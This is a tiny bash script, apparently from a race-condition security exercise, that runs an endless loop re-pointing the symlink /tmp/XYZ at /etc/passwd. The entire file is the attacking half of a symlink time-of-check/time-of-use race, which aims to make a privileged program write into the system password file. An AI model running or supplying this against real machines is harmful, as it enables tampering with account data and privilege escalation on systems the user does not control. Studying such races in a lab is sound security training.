#!/bin/bash

echo "Running raceCond1!"

while (( 1==1 ))
do
	ln /etc/passwd -sf /tmp/XYZ
done

exit $?
